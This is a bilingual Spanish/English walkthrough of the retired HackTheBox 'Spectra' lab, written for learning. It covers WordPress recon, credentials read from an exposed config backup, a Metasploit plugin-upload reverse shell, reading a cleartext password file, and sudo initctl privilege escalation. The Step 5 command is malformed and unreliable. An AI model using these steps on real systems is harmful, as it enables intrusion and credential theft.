# Spectra [Easy]

> **ES:** Máquina Linux Easy con WordPress 5.4.2 y dir `/testing` que expone `wp-config.php.save`; login reutilizado, shell vía plugin y root con `initctl` + SETENV.
> **EN:** Easy Linux box with WordPress 5.4.2 and a `/testing` dir exposing `wp-config.php.save`; reused login, shell via plugin, and root with `initctl` + SETENV.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Spectra] |
| **URL** | https://app.hackthebox.com/machines/Spectra |
| **IP lab** | 10.10.10.229 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía WordPress (credencial reutilizada + upload) y `sudo /sbin/initctl` con SETENV.
> **EN:** Get `user.txt` and `root.txt` via WordPress (reused credential + upload) and `sudo /sbin/initctl` with SETENV.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] wpscan (versión 5.4.2, tema twentytwenty)
- [ ] dirsearch (`/main/ /testing/`)
- [ ] Metasploit `wp_admin_shell_upload` (o plugin manual)
- [ ] ssh / sudo -l (initctl + GTFOBins)

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Puertos 22, 80 (nginx 1.17.4) y 3306. La raíz enlaza a `/main/` y `/testing/`; añadir `spectra.htb` a hosts.
> **EN:** Ports 22, 80 (nginx 1.17.4) and 3306. Root links to `/main/` and `/testing/`; add `spectra.htb` to hosts.

```bash
nmap -sC -sV -p- -oN nmap_init 10.10.10.229
echo '10.10.10.229 spectra.htb' | sudo tee -a /etc/hosts
curl -s http://spectra.htb/
```

**Resultado / Result:** WordPress en `/main/`, directorio listado en `/testing/`. Capturas en `img/` original.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** `wpscan` confirma WP 5.4.2; en `/testing/` hay `wp-config.php.save` legible con credenciales DB que, probadas en `wp-login.php`, dan acceso como `administrator`.
> **EN:** `wpscan` confirms WP 5.4.2; `/testing/` has a readable `wp-config.php.save` with DB creds that, tried at `wp-login.php`, grant `administrator` access.

```bash
wpscan --url http://spectra.htb/main/ --enumerate u,p
dirsearch -u http://spectra.htb/
curl -s http://spectra.htb/testing/wp-config.php.save
```

**Resultado / Result:** Login válido al admin de WordPress (credencial no reproducida literal aquí).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Subir payload PHP como plugin desde el admin (módulo Metasploit o ZIP manual) → Meterpreter/shell como `nginx`.
> **EN:** Upload a PHP payload as a plugin from the admin (Metasploit module or manual ZIP) → Meterpreter/shell as `nginx`.

```bash
msfconsole -q -x "use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS 10.10.10.229; set TARGETURI /main; set USERNAME administrator; set PASSWORD <redacted>; set LHOST TU-IP; exploit"
whoami; id
```

**Resultado / Result:** Shell web como `nginx` en el host `spectra`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** En `/etc/autologin/passwd` hay password en claro reutilizada por `katie` → SSH y lectura de `user.txt` (flag no publicada).
> **EN:** In `/etc/autologin/passwd` there is a cleartext password reused by `katie` → SSH and read `user.txt` (flag not published).

```bash
cat /etc/autologin/passwd
ssh katie@spectra.htb
cat /home/katie/user.txt  # solo en lab retirado
sudo -l
```

**Resultado / Result:** `katie` puede correr `(ALL) SETENV: NOPASSWD: /sbin/initctl`.

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** Abusar de `initctl` con `SETENV` (técnica GTFOBins: manipular entorno/funciones o job malicioso) para shell root.
> **EN:** Abuse `initctl` with `SETENV` (GTFOBins technique: environment/function or malicious job manipulation) for a root shell.

```bash
sudo -l
# Concepto (parafraseado, ver GTFOBins initctl con SETENV):
sudo SETENV=/usr/sbin/initctlestatus 2>/dev/null || sudo --preserve-env -l
cat /root/root.txt  # solo en lab retirado
```

**Resultado / Result:** Root vía binario de init con entorno preservado.

---

## 🧠 Lo aprendido / Learned

> **ES:** Backups con extensión `.save` servidos en claro; reutilización DB→admin; webshell vía plugins WP; privesc con `SETENV` NOPASSWD.
> **EN:** Backups with `.save` extension served in clear; DB→admin reuse; webshell via WP plugins; privesc with NOPASSWD `SETENV`.

- [ ] `wpscan` + revisión manual de `/testing/`
- [ ] `wp_admin_shell_upload`
- [ ] `sudo (ALL) SETENV: NOPASSWD: /sbin/initctl`

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Notas locales `index.md` + capturas en `img/` (contenido propio previo, sin normalizar)
- **Walkthrough de referencia:** [verificar en app.hackthebox.com/machines/Spectra]
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Nota original en chino/inglés migrada al molde bilingüe ES/EN; flags y credenciales ofuscadas, pasos parafraseados.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
